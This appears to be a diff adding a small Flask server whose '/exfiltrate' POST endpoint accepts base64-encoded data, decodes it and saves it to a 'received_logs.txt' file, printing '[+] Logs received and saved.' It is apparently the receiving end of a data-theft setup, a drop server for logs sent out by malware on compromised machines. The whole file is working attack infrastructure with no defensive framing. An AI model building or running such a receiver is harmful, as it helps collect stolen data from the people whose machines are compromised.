@@ -1,0 +1,17 @@
+from flask import Flask, request
+import base64
+
+app = Flask(__name__)
+
+@app.route('/exfiltrate', methods=['POST'])
+def exfiltrate():
+    data = request.form.get('payload')
+    if data:
+        decoded = base64.b64decode(data)
+        with open("received_logs.txt", "wb") as f:
+            f.write(decoded)
+        print("[+] Logs received and saved.")
+    return "OK"
+
+if __name__ == '__main__':
+    app.run(port=5000)
